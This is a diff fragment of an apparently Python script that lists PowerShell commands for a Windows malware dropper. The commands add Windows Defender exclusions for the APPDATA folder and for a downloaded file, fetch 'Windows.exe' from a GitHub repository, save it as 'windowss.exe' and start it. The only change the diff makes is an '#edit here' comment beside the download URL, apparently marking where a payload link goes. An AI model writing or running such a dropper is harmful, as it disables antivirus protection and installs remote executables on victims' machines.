@@ -32,7 +32,7 @@ time.sleep(3.8)
 
 commands = [
     'Add-MpPreference -ExclusionPath "$env:APPDATA" -Force',
-    'IWR https://github.com/roxcansanto/selam/raw/refs/heads/main/Windows.exe -OutFile \"$env:APPDATA\\windowss.exe"',
+    'IWR https://github.com/roxcansanto/selam/raw/refs/heads/main/Windows.exe -OutFile \"$env:APPDATA\\windowss.exe"', #edit here
     'Add-MpPreference -ExclusionProcess "$env:APPDATA\\windowss.exe" -Force',
     'Start-Process "$env:APPDATA\\windowss.exe"',
     'Start-Sleep -Seconds 4',  
